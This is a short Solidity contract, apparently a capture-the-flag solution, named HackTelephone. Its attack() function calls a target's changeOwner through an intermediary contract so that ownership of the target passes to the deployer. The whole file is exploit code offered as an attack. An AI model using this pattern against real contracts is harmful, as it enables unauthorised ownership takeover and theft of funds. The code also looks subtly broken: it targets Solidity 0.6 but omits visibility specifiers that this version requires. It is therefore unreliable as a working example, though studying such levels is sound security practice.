// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}


contract HackTelephone {
  ITelephone telephone;
  address payable public owner;

  constructor(ITelephone _telephone){
    telephone = ITelephone(_telephone);
    owner = payable(msg.sender);
  }

  function attack() {
    telephone.changeOwner(owner);
  }

}
